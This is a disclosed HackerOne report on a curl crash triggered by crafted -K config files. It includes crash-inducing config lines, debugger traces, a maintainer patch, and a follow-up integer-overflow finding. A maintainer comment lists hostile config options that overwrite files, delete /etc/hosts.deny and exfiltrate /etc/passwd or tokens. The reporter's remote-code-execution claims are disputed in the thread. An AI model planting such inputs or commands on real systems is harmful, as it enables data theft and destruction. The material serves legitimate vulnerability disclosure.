---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/heap-overflow
  - env/web
  - vuln/path-traversal
  - vuln/code-injection
  - vuln/info-disclosure
  - vuln/dos
  - impact/rce
substate: "informative"
weakness: "Heap Overflow"
enriched: true
body: true
date: 2025-04-27
submitted: 2025-04-15T14:39:03.280Z
bounty_usd: null
votes: 29
cve: []
program: "[[programs/curl|curl]]"
reporter: "bsr13"
source: "https://hackerone.com/reports/3094406"
title: "Heap‑based buffer overflow in curl -K <config_file> allows arbitrary write ."
---
# Heap‑based buffer overflow in curl -K <config_file> allows arbitrary write .

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 29 | **Program:** curl | **Disclosed:** 2025-04-27

- Report: [https://hackerone.com/reports/3094406](https://hackerone.com/reports/3094406)
- CWE: Heap Overflow
- Submitted: 2025-04-15T14:39:03.280Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
  A heap‑based buffer overflow in curl’s config‑file parser (`parseconfig()` --> `getparameter()`) allows an attacker supplying a crafted config file to overwrite internal pointers (via `cleanarg()`), leading to a write‑what‑where primitive and potential remote code execution.


## Affected version
  -curl 8.13.0 (x86_64-pc-linux-gnu) libcurl/8.13.0 OpenSSL/3.0.13 libpsl/0.21.2
    Release-Date: 2025-04-02

  - or any Version after  version 8.13.0 (dev-versions) that include `cleanarg()` and have writable argv support



## Steps To Reproduce:
 - tested on both Ubuntu 24.04.1 [Linux bobo-pc-1701 6.11.0-21-generic #21~24.04.1-Ubuntu ] AND 
                  Kali 6.11.2-1kali1 [Linux kali 6.11.2-amd64]  

  1. Download the last release from github and unizp it: 
    wget https://github.com/curl/curl/releases/download/curl-8_13_0/curl-8.13.0.zip && unzip curl-8.13.0.zip && cd curl-8.13.0

  2. Build and install: 
    ./configure --with-openssl
     make all && sudo make install 
     curl --version

  3.  -The crash could be caused by crafted config file that contains one of this payloads;
       -> It could be appended anywhere in new line in config-file;
       -> All the inputs lead to one crash path.
 
            echo -ne "-vvvuAAAA" > malicious_config_file1.conf     (u for --user <user:password> )
            echo -ne "-vvvUAAAA" > malicious_config_file2.conf     (U for --proxy-user <user:password> )
            echo -ne "-vvvEAAAA" > malicious_config_file3.conf     (E for --cert <certificate[:password]> )

  
  4. 
       curl -K malicious_config_file1.conf  
       zsh: segmentation fault  curl -K malicious_config_file1.conf
     ---------------- Or ------------------
     curl -K malicious_config_file2.conf 
        zsh: segmentation fault  curl -K malicious_config_file2.conf
      ---------------- Or ------------------
     curl -K malicious_config_file3.conf 
        zsh: segmentation fault  curl -K malicious_config_file3.conf
 
  >> sudo dmesg |tail -n 6

        [176771.791272] curl[132987]: segfault at 5 ip 00007f3a8db8b75d sp 00007ffd419fd958 error 4 in libc.so.6[18b75d,7f3a8da28000+188000] likely on CPU 3 (core 3, socket 0)
        [176771.791357] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 89 f8 48 89 fa c5 f9 ef c0 25 ff 0f 00 00 3d e0 0f 00 00 0f 87 33 01 00 00 <c5> fd 74 0f c5 fd d7 c1 85 c0 74 57 f3 0f bc c0 c5 f8 77 c3 66 66

        [176778.655937] curl[132996]: segfault at 5 ip 0000792ad5f8b75d sp 00007fff028cfc18 error 4 in libc.so.6[18b75d,792ad5e28000+188000] likely on CPU 6 (core 2, socket 1)
        [176778.656011] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 89 f8 48 89 fa c5 f9 ef c0 25 ff 0f 00 00 3d e0 0f 00 00 0f 87 33 01 00 00 <c5> fd 74 0f c5 fd d7 c1 85 c0 74 57 f3 0f bc c0 c5 f8 77 c3 66 66

        [176783.987409] curl[133003]: segfault at 5 ip 000079c33cd8b75d sp 00007ffe06464158 error 4 in libc.so.6[18b75d,79c33cc28000+188000] likely on CPU 0 (core 0, socket 0)
        [176783.987474] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 89 f8 48 89 fa c5 f9 ef c0 25 ff 0f 00 00 3d e0 0f 00 00 0f 87 33 01 00 00 <c5> fd 74 0f c5 fd d7 c1 85 c0 74 57 f3 0f bc c0 c5 f8 77 c3 66 66


## Triaging the crash: 
 1.To triage this we need to build with extra flags:  

    >> CFLAGS="-fsanitize=address,undefined -g -O0 -fno-omit-frame-pointer" ./configure --with-openssl    
    >> make all && sudo make install 

  2.Run curl : 
    ------------------------------------- Asan output ----------------------------------
    pc@pc22:~/Downloads$ curl -K malicious_config_file1.conf 
    AddressSanitizer:DEADLYSIGNAL
    ------------------------------------------------------------------------------------
          ==140300==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000005 (pc 0x72133b58b75d bp 0x7ffe1b2c0b20 sp 0x7ffe1b2c02a8 T0)
          ==140300==The signal is caused by a READ memory access.
          ==140300==Hint: address points to the zero page.
              #0 0x72133b58b75d in __strlen_avx2 ../sysdeps/x86_64/multiarch/strlen-avx2.S:76
              #1 0x63e45d7996dc in cleanarg /home/bobo/Downloads/curl-8.13.0/src/tool_getparam.c:583
              #2 0x63e45d7b2d19 in getparameter /home/bobo/Downloads/curl-8.13.0/src/tool_getparam.c:2901
              #3 0x63e45d7b1ad8 in getparameter /home/bobo/Downloads/curl-8.13.0/src/tool_getparam.c:2790
              #4 0x63e45d7b4205 in parse_args /home/bobo/Downloads/curl-8.13.0/src/tool_getparam.c:3016
              #5 0x63e45d7b76ba in main /home/bobo/Downloads/curl-8.13.0/src/tool_main.c:284

      AddressSanitizer can not provide additional info.
      SUMMARY: AddressSanitizer: SEGV ../sysdeps/x86_64/multiarch/strlen-avx2.S:76 in __strlen_avx2
      ==140300==ABORTING

  - We can Also confirm the crash path using gdb (with GEF extension installed ):
    >> gdb curl 
    (gef)> r -K malicious_config_file1.conf
    (gef)> where 
    --------------------------------- gdb output ------------------------------------------------------
      #0  __strlen_avx2 () at ../sysdeps/x86_64/multiarch/strlen-avx2.S:76
      #1  0x00007ffff787d827 in ___interceptor_strlen (s=0x5 <error: Cannot access memory at address 0x5>) at ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:389
      #2  0x00005555555926dd in cleanarg (str=0x5 <error: Cannot access memory at address 0x5>) at tool_getparam.c:583
      #3  0x00005555555abd1a in getparameter (flag=0x50300000f281 "vvvuAAAA", nextarg=0x50300000f285 "AAAA", cleararg1=0x0, cleararg2=0x0, usedarg=0x7fffffffd79e, global=0x7ffff4300030, 
          config=0x51a000000080) at tool_getparam.c:2901
      #4  0x00005555555b9434 in parseconfig ()
      #5  0x00005555555aaad9 in getparameter (flag=0x7fffffffe1b8 "K", nextarg=0x7fffffffe1ba "malicious_config_file1.conf", cleararg1=0x7fffffffe1b7 "-K", 
          cleararg2=0x7fffffffe1ba "malicious_config_file1.conf", usedarg=0x7ffff4200030, global=0x7ffff4300030, config=0x51a000000080) at tool_getparam.c:2790
      #6  0x00005555555ad206 in parse_args (global=0x7ffff4300030, argc=0x3, argv=0x7fffffffde48) at tool_getparam.c:3016
      #7  0x00005555555b6a45 in operate ()
      #8  0x00005555555b06bb in main (argc=0x3, argv=0x7fffffffde48) at tool_main.c:284
  --------------------------------- Code ----------------------------------------------------------------------
          0x7ffff678b74d <__strlen_avx2+000d> and    eax, 0xfff
          0x7ffff678b752 <__strlen_avx2+0012> cmp    eax, 0xfe0
          0x7ffff678b757 <__strlen_avx2+0017> ja     0x7ffff678b890 <__strlen_avx2+336>
        → 0x7ffff678b75d <__strlen_avx2+001d> vpcmpeqb ymm1, ymm0, YMMWORD PTR [rdi]         // $rdi = 0x5 so unvalid address 
          0x7ffff678b761 <__strlen_avx2+0021> vpmovmskb eax, ymm1
          0x7ffff678b765 <__strlen_avx2+0025> test   eax, eax
          0x7ffff678b767 <__strlen_avx2+0027> je     0x7ffff678b7c0 <__strlen_avx2+128>
          0x7ffff678b769 <__strlen_avx2+0029> tzcnt  eax, eax
          0x7ffff678b76d <__strlen_avx2+002d> vzeroupper 
  -------------------------------------------------------------------------------------------------------------
    - From the above output we can see that: 
     1.the root cause of the crash is that strlen tried to load the data at invalid address (0x5), So it’s an invalid pointer dereference into unmapped memory.
    
     2. --------
     #2  0x00005555555926dd in cleanarg (str=0x5 <error: Cannot access memory at address 0x5>) at tool_getparam.c:583
     #3  0x00005555555abd1a in getparameter (flag=0x50300000f281 "vvvuAAAA", nextarg=0x50300000f285 "AAAA", cleararg1=0x0, cleararg2=0x0, usedarg=0x7fffffffd79e, global=0x7ffff4300030, 
        config=0x51a000000080) at tool_getparam.c:2901

     Moreever, we can see that the crash happened in `getparameter()` function tool_getparam.c:2901, which calls `cleanarg(clearthis)` with invalid address which passed to strlen.  

     3. In order to understand where is the invalid address come from , I set a breakpoint in gdb just before `cleanarg(clearthis)` in tool_getparam.c:2901 and tool_getparam.c:2900 ( - Not that for other options like --proxy-user [U] or --cert(E) you have to set breakpoints at different lines in tool_getparam.c )

       see:   https://github.com/curl/curl/blob/master/src/tool_getparam.c#L2898-L2902
        
```
2898     case C_USER: /* --user */
2899       /* user:password  */
2900       err = getstr(&config->userpwd, nextarg, ALLOW_BLANK); //------set break point here  ----
2901       cleanarg(clearthis);                                  //--------- set break point here  --------       
2902       break;

```
 
        >> gdb curl 
        (gef)> break tool_getparam.c:2900
        (gef)> break tool_getparam.c:2901
        (gef)> r -K malicious_config_file1.conf

              ──────────────────────source:tool_getparam.c+2900 ───────────────
```
2895	     case C_UPLOAD_FILE: /* --upload-file */
2896	       err = parse_upload_file(config, nextarg);
2897	       break;
2898	     case C_USER: /* --user */
2899	       /* user:password  */
// nextarg=0x00007fffffffd5a0  →  [...]  →  0xbebebe0041414141 ("AAAA"?), config=0x00007fffffffd578  →  [...]  →  0x0000000000000000
●-> 2900	       err = getstr(&config->userpwd, nextarg, ALLOW_BLANK);
●  2901	       cleanarg(clearthis);
2902	       break;
2903	     case C_PROXY_USER: /* --proxy-user */
2904	       /* Proxy user:password  */
2905	       err = getstr(&config->proxyuserpwd, nextarg, ALLOW_BLANK);
```           
             ────────────── threads ─────────────
              [#0] Id 1, Name: "curl", stopped 0x5555555abc83 in getparameter (), reason: BREAKPOINT
              ────────────── trace ──────────────
              [#0] 0x5555555abc83 → getparameter(flag=0x50300000f281 "vvvuAAAA", nextarg=0x50300000f285 "AAAA", cleararg1=0x0, cleararg2=0x0, usedarg=0x7fffffffd79e, global=0x7ffff4300030, config=0x51a000000080)
              [#1] 0x5555555b9434 → parseconfig()
              [#2] 0x5555555aaad9 → getparameter(flag=0x7fffffffe1b9 "K", nextarg=0x7fffffffe1bb "malicious_config_file1.conf", cleararg1=0x7fffffffe1b8 "-K", cleararg2=0x7fffffffe1bb "malicious_config_file1.conf", usedarg=0x7ffff4200030, global=0x7ffff4300030, config=0x51a000000080)
              [#3] 0x5555555ad206 → parse_args(global=0x7ffff4300030, argc=0x3, argv=0x7fffffffde48)
              [#4] 0x5555555b6a45 → operate()
              [#5] 0x5555555b06bb → main(argc=0x3, argv=0x7fffffffde48)
              ──────────────────────────────────────────────────────────────
            
              (gef)> p clearthis 
                   $1 = 0x5 <error: Cannot access memory at address 0x5>
              


             -> We hit at the first breakpoint and we confirmed that the clearthis value has been modified (invalid address)
             -> then we verified where the variable clearthis could be modified in the code (tool_getparam.c)
           
               See:   https://github.com/curl/curl/blob/master/src/tool_getparam.c#L1787-L1798
 ```
1787   #ifdef HAVE_WRITABLE_ARGV
1788           clearthis = &cleararg1[parse + 2 - flag];
1789   #endif
1790         }
1791         else if(!nextarg) {
1792           err = PARAM_REQUIRES_PARAMETER;
1793           break;
1794         }
1795         else {
1796   #ifdef HAVE_WRITABLE_ARGV
1797           clearthis = cleararg2;
1798   #endif
```
             
            -> Now we know that if the palfrom supports writable argv[], the clearthis is calculated with the following expression
                                
                                ---> Clearthis = &cleararg1[parse + 2 - flag];     

                  (gef)>  p &parse
                     $12 = (const char **) 0x7fffffffd5c0
                  (gef)> p parse
                     $13 = 0x50300000f284 "uAAAA"
                  ------------------------- 
                  (gef)> p &flag 
                      $14 = (const char **) 0x7fffffffd5a8
                  (gef)> p flag
                    $15 = 0x50300000f281 "vvvuAAAA"
                  -------------------------
                  (gef)> p &cleararg1
                    $16 = (char **) 0x7fffffffd598
                  (gef) = p cleararg1
                    $17 = 0x0
                  -------------------------
                  (gef)> p parse+2-flag     
                    $17 = 0x5             // 0x50300000f284 +2 - 0x50300000f281

              -> From the above output we can see that the value of clearthis is: (2 +  the number of "v" letters [in our example ] = 0x5 ), which means that an attacker could partially control the what's written in [rdi] register which may lead to arbitrary read/write or code execution.
            
      ## Fix suggestions: 
         I'm not entirely sure this is the ideal fix since I'm not an expert in C programming, but here's the best approach I could come up with: 

        - Since we know exactly where clearthis is supposed to point (somewhere within the cleararg1 buffer), we can validate the pointer by ensuring it falls within the bounds of that buffer and points to a NUL-terminated string so we can safely use the pointer without risking out-of-bounds access or undefined behavior.


      ## Possible exploitation Scenarios: 
         - Chain multiple overwrites:  if an attacker managed to call cleanarg(), he might be able to accumulate a larger total write.

        - Achieving arbitrary code execution would be highly complex especially on x64 bit, However advanced exploitation techniques **such as partial pointer overwrites, feg shui or heap grooming (e.g., manipulating allocations to position attacker-controlled buffers adjacent to sensitive heap structures) ** could theoretically enable an attacker to overwrite function pointers and hijack control flow.
        
        - This also could leak heap contents (pointers or secrets)

        Note  that : ** the above attacks are more likely to occur in x86 bit architechure **


## Supporting Material/References:
  - CWE-122: Heap-based Buffer Overflow: https://cwe.mitre.org/data/definitions/122.html

## Impact

- Arbitrary Write: An attacker might achieve a write‑what‑where condition, which allow to modify arbitrary memory locations within the process’s address space.

- Potential Remote Code Execution: With advanced techniques (partial pointer overwrite, heap grooming, ...), the attacker could overwrite function pointers or return addresses, leading to full control of execution flow and the ability to run arbitrary code as the curl process.

- Information Disclosure: pointing clearthis at attacker-chosen addresses and calling strlen() can leak heap contents (such as pointers, secrets, or other sensitive data) by returning string lengths or causing controlled crashes.

## Timeline

- **Report Filed**
- **2025-04-15** @bagder: Thank you for your report!

We will take some time and investigate your reports and get back to you with details and possible follow-up questions as soon as we can! Most likely within the next 24 hours.

We always strive to fix reported problems as fast as possible. Issues with severity Low or Medium we merge into the next release in the ordinary release cycle. Only for more serious problems we might  release fix early.
- **2025-04-15** @bagder: I can confirm the crash, even if "arbitrary write" seems a bit strong.

The bug is  code that indexes a NULL pointer with some arithmetic, so that the code then tries to memset() zeroes on that (low number) addresses. The contents of the config file can then affect exactly which low number address to memset. That is probably "the heap", but not likely to be writable in most architectures.

So yes, if an attacker can pass on a config file to a curl user, this is what they can have done. The report mentions things that can be done using an arbitrary heap write, but this is not that. This is more limited. I believe the largest address this can reach is based on the line length, which cannot be larger than 10*1024*1024 (0xa0000).

This said, I'm not even sure "tricking a user into running a custom config file" is even an interesting attack case. If you can trick a user into running curl on a custom config file, then it seems a lot of checks and bets are off and you can probably make the user do all sorts of other dumb things onto themselves. Similar to tricking the user to run "rm -rf /".
- **2025-04-15** @bagder: My first take at a patch for this:

~~~diff
diff --git a/src/tool_getparam.c b/src/tool_getparam.c
index a55973a60a..e64239e5fa 100644
--- a/src/tool_getparam.c
+++ b/src/tool_getparam.c
@@ -1783,20 +1783,22 @@ ParameterError getparameter(const char *flag, /* f or -long-flag */
       /* this option requires an extra parameter */
       if(!longopt && parse[1]) {
         nextarg = &parse[1]; /* this is the actual extra parameter */
         singleopt = TRUE;   /* do not loop anymore after this */
 #ifdef HAVE_WRITABLE_ARGV
-        clearthis = &cleararg1[parse + 2 - flag];
+        if(cleararg1)
+          clearthis = &cleararg1[parse + 2 - flag];
 #endif
       }
       else if(!nextarg) {
         err = PARAM_REQUIRES_PARAMETER;
         break;
       }
       else {
 #ifdef HAVE_WRITABLE_ARGV
-        clearthis = cleararg2;
+        if(cleararg2)
+          clearthis = cleararg2;
 #endif
         *usedarg = TRUE; /* mark it as used */
       }
 
       if((ARGTYPE(a->desc) == ARG_FILE) &&
- **2025-04-16** @jimfuller2024: nice catch ! 

https://github.com/curl/curl/commit/654f8cb5f353905c6eb5b2a6ef7e5beafa7d0634 looks like the offending commit.

This is a very hard to exploit theoretical vulnerability ... also agree that  this is much narrower then 'arbitrary write' though willing to be proven wrong I cannot see it - definitely a bug.
- **2025-04-16** @bagder: > looks like the offending commit.

This matches my conclusion. Shipped for the first time in 8.13.0.
- **2025-04-16** @jimfuller2024: ya it is a bit tricky ... I guess the only viable scenario is when the user is not aware their config file has been manipulated - that implies attacker had user perms to manipulate said config file. 

The combination of 'difficult to exploit theoretical vuln' and 'user privs required to trigger' makes this likely  to be just a bug ... however if those two assumptions loosen (with any more information) willing to consider a LOW.
- **2025-04-16** @bsr13: Thank you for your feedback, I appreciate the confirmation of the crash, A few points in response:

1. A simple overflow migh not directly cause a crash. But with the two or mutiple stage overwrite techniques, you can turn that crash into a precise write primitive, From there an attacker might be capable of overwriting GOT entries, saved return addresses,or other function pointers to achieve code execution. This isn’t theoretical, many public exploits leverage exactly this pattern.
 
2. Additionally, even a single crafted config file can cause a crash or leak information, which is also a valid security concern.

3. While it’s totally correct that an attacker must convince a user to run curl with malicious config file, that’s a realistic scenario and very common thing to occur, in many environments CI pipelines, automated update scripts, or even malicious software packages that ship a trojaned config file Once the config is loaded, the rest of the exploit is fully automated and silent. 

4.This said, I'm not even sure "tricking a user into running a custom config file" ... Similar to tricking the user to run "rm -rf /" : ==>  I would consider this scenario valid only if curl were explicitly designed to execute arbitrary system commands directly. However, that's not the case. This vulnerability arises from how curl processes configuration files, not from any inherent command execution capability, Therefore, I believe this represents an indirect scenario where command execution could occur. Ultimately, it's up to you to determine whether this constitutes a security vulnerability, but I believe it's a valid threat model to consider. 
---------------------------------------------------------
And Finally for the patch you have provided, it's working flawlessly, I've tested it with all the inputs that previously triggered the bug, and no issues have occurred.
- **2025-04-16** @dfandrich: The `rm -rf /` example is hyperbolic, but nearly as dangerous commands *could* be embedded in a config file. For example, `-T config file:.bashrc` to overwrite a file, `-Q rm /etc/hosts.deny` to delete a file, `-d @/etc/passwd` to exfiltrate a file, or `--variable %TOKEN --expand-data secret='{{TOKEN}}'` to exfiltrate an environment variable, just to name a few examples. The point is that if the user can specify a config file it's already game over, and any bugs hardly make the situation any worse.
- **2025-04-16** @bagder: > A simple overflow might not directly cause a crash

This isn't what I would call a "simple overflow". It copies zeroes to a low memory address. To me, it seems unlikely to ever do something else than just crashing.

> From there an attacker might be capable of overwriting GOT entries, saved return addresses,or other function pointers to achieve code execution

Please explain how this is done. I cannot see how this flaw enables this so I would be thrilled to learn. Also, even if you could make it do something crazy, this would just overwrite something in the curl tool that runs with your existing user rights already with access to the same data and files. It is unclear what an attacker would gain by tricking curl to do something slightly different when you can already make it do network transfers, local and remote and you can send off any local data should you want to. Like @dfandrich shows above.

> Additionally, even a single crafted config file can cause a crash or leak information, which is also a valid security concern

Please explain how you can use this flaw to leak information not already available to the user. My imagination is too limited to figure that out.
- **2025-04-17** @bsr13: Thank you all for your feedback. 

I’d love to invest the time to develop a working exploit (at least on x86 arch) for this bug, But I simply don’t have the time right now, My primary focus remains on libcurl’s internal.

With that in mind, Im curious if you believe this bug is worth pursuing further?
- **2025-04-18** @bagder: > With that in mind, Im curious if you believe this bug is worth pursuing further?

I'm not sure I can answer that.

It is our task to assess this report and primarily come down to whether this is a security vulnerability at all. So far, we have not figured a way how this can actually be used or abused by a malicious user. If we cannot figure out even one way it can, then I don't think we can qualify this as a vulnerability but instead as a "normal" bug.

We are a whole team here, and none of us has yet seen a vulnerability here. 

If you think you could develop an exploit for this you could instead just tell us the concept and your ideas of how it would work. You don't have to spend time to actually do it. We can talk concepts and theories as well.
- **2025-04-20** @bagder: I'd like to amend my previous analysis slightly: 

The bad code first invokes strlen() on the low address, and only after successfully getting a number back, it writes 0x20 that number of times to that address and onward.
- **2025-04-20** @bagder: PR: https://github.com/curl/curl/pull/17112
- **Report Informative**
- **2025-04-24** @bsr13: I'm not sure If I should repport this as a seperate repport or not (Because I believe it's not related to the bug we have repporeted.)

Note that This is a follow-up to my recent test of the patch (https://github.com/curl/curl/commit/da9494eef043aca89ebdb5e4e14fcceef52c98e7) 

=> After Testing the latest patch (curl 8.14.0-DEV) using fuzzing (afl++ with fixed seed : 9991 runninng for almost 11 hours ) with address sanitizer enabled we found this crash (signed integer overflow - undefined behavior): 
 
=> To reproduce : 

make clean 

export CFLAGS="-m64 -fsanitize=address,undefined -g -O0 -fno-omit-frame-pointer"   

./configure --with-openssl 
make all 
sudo make install 

export LSAN_OPTIONS=verbosity=0:log_threads=1  // you edit verbosity for more details ...

echo 'max-time = 22222242222222222' > ok.conf 

└─$ curl -K ok.conf
tool_paramhlp.c:348:22: runtime error: signed integer overflow: 22222242222222222 * 1000 cannot be represented in type 'long int'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   156    0   156    0     0    265      0 --:--:-- --:--:-- --:--:--   266
==396085==Processing thread 396083.
==396085==Stack at 0x7fff67053000-0x7fff67853000 (SP = 0x7fff67850ac0).
==396085==TLS at 0x7f912aa6d000-0x7f912aa6e340.
                                                         
Analyse the root cause : 

=> in gdb 

        └─$ gdb curl -ex "break tool_getparam.c:2810" -ex "break tool_paramhlp.c:348" -ex "r -K ok.conf" 


----------- First break point  -------------------------
──────────────────────────────────────────────────────────────────────────────────── source:tool_getparam.c+2810 ────
   2805	     case C_LOCATION: /* --location */
   2806	       config->followlocation = toggle; /* Follow Location: HTTP headers */
   2807	       break;
   2808	     case C_MAX_TIME: /* --max-time */
   2809	       /* specified max time */
                            // nextarg=0x00007fffffffd3a0  →  [...]  →  "22222242222222222utpuAAAAAAAA", config=0x00007fffffffd520  →  [...]  →  0x0000000000000000
●→ 2810	       err = secs2ms(&config->timeout_ms, nextarg);
   2811	       break;
   2812	     case C_MANUAL: /* --manual */
   2813	       if(toggle) { /* --no-manual shows no manual... */
   2814	 #ifndef USE_MANUAL
   2815	         warnf(global,

    
----------- Second break point  -------------------------
gef➤  continue 

───────────────────────────────────────────────────────────────────────────────────── source:tool_paramhlp.c+348 ────
    343	       len--;
    344	     }
    345	     ms = ((long)fracs * 100) / digs[len - 1];
    346	   }
    347	 
                        // valp=0x00007fffffffd228  →  [...]  →  0x0000000000000000, ms=0x0
●→  348	   *valp = (long)secs * 1000 + ms;
    349	   return PARAM_OK;
    350	 }
    351	 
    352	 /*
    353	  * Implement protocol sets in null-terminated array of protocol name pointers.


gef➤  p/d secs
$1 = 22222242222222222


gef➤  next 
───────────────────────────────────────────────────────────────────────────────────── source:tool_paramhlp.c+349 ────
    344	     }
    345	     ms = ((long)fracs * 100) / digs[len - 1];
    346	   }
    347	 
●   348	   *valp = (long)secs * 1000 + ms;
 →  349	   return PARAM_OK;
    350	 }
    351	 
    352	 /*
    353	  * Implement protocol sets in null-terminated array of protocol name pointers.
    354	  */
──────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "curl", stopped 0x5555556bd0e8 in secs2ms (), reason: SINGLE STEP
────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[!] Cannot access memory at address 0x34654390083e2240
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  where 
#0  secs2ms (valp=0x51a0000004b8, str=<error reading variable: Cannot access memory at address 0x34654390083e2240>)
    at tool_paramhlp.c:349
#1  0x00005555556848df in getparameter (flag=0x50c000000ac0 "max-time", nextarg=0x503000023fe0 "22222242222222222", 
    cleararg1=0x0, cleararg2=0x0, usedarg=0x7ffff2909da0, global=0x7ffff2a09030, config=0x51a000000080)
    at tool_getparam.c:2810
#2  0x00005555556c0df9 in parseconfig (filename=0x7fffffffdf64 "ok.conf", global=0x7ffff2a09030)
    at tool_parsecfg.c:178
#3  0x0000555555684579 in getparameter (flag=0x7fffffffdf62 "K", nextarg=0x7fffffffdf64 "ok.conf", 
    cleararg1=0x7fffffffdf61 "-K", cleararg2=0x7fffffffdf64 "ok.conf", usedarg=0x7ffff2909d30, 
    global=0x7ffff2a09030, config=0x51a000000080) at tool_getparam.c:2792
#4  0x0000555555686a3c in parse_args (global=0x7ffff2a09030, argc=0x3, argv=0x7fffffffdb98) at tool_getparam.c:3018
#5  0x00005555556b8ef9 in operate (global=0x7ffff2a09030, argc=0x3, argv=0x7fffffffdb98) at tool_operate.c:3182
#6  0x0000555555691159 in main (argc=0x3, argv=0x7fffffffdb98) at tool_main.c:284

=> 
    - secs*1000 = 0x134654390083e22b0 = 22222242222222222000  which is way more than - signed - C long int ( typically (2**63) -1 on 64-bit = LONG_MAX = 9223372036854775807)
    - This leads to corrupting *valp (the timeout value stored in config->timeout_ms) which is a signed integer overflow - undefined behavior.
    - Tt also works on command line: 
            curl -m  22222242222222222 "https://webhook.site/cdf448eb-f510-4995-9212-40fbc1cb109f"

Possible Impacts  (None): 
   We believe this issue is unlikely to have any significant impact in the context of configuration files or command-line usage. However, it may still lead to some undefined behavior.
- **2025-04-24** @bsr13: > Thank you for your excellent report! After careful consideration, we have come to the conclusion that this is not security vulnerability as mentioned already. The bug has been fixed in git in the meantime.

Thank you all for the feedbacks and for taking the time to review my report. If it’s alright with you, I’d love to request that the report be made public (disclosed), as I believe it might be useful for others who are exploring similar areas.

Also, I just wanted to add one final note that might be of interest for anyone digging further into this behavior:

> I noticed that the default curl configuration file (`.curlrc`) is also affected. Even when explicitly passing another "safe" config file using the `-K` option, curl still seems to prioritize the `.curlrc` file first, which leads to the crash.  
> Not sure if this behavior is intended, but it might be relevant if someone finds a more impactful way to exploit this.

Thanks again for the opportunity and for the great interaction!
- **Agreed On Going Public**
- **2025-04-25** @bagder: Your second issue mentioned here is clearly a separate one; an integer overflow in the secs2ms() function. The impact of it is in all practical matters just a wrong timeout value for the three different timeout values that use this function. I'm writing up a PR for it.
- **Agreed On Going Public**
- **Report Became Public**
- **Report Collaborator Invited**
